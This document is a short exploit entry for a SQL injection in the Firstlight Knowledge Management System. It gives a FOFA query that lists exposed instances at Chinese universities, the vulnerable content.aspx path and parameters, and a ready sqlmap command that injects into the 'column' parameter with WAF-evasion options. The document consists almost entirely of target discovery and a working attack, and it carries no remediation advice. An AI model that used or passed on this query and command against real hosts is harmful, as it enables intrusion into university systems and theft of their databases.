---
title: Firstlight Knowledge Management System SQL Injection
---

# Firstlight Knowledge Management System SQL Injection

## FOFA

```
host="firstlight.cn" && country="CN" && (title="大学" || title="学院")
```

## Vulnerable URL

To verify whether unrestricted access exists, visit the following path:

```
/Customer/content.aspx?column=&kind=&wd=111&kkk=1&kf=1&field=1
```

## Vulnerability POC

```
python3 sqlmap.py -u "http://xxxx.firstlight.cn/Customer/content.aspx?column=&kind=&wd=111&kkk=1&kf=1&field=1" -p "column" --random-agent --batch --no-cast -skip-waf
```

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240624190455747.png)
